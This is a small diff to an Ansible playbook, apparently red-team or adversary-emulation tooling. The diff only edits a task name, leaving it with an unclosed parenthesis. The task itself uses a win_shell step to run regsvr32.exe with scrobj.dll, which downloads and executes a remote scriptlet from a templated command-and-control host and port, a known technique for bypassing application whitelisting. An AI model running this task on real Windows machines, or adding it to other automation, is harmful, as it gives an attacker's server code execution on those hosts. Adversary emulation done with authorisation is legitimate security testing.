@@ -4,6 +4,6 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-    - name: Run regsvr32 to download and execute script
+    - name: Run regsvr32 to download and execute script (create a new file c:\temp\cnc.sct
       win_shell: |
         regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
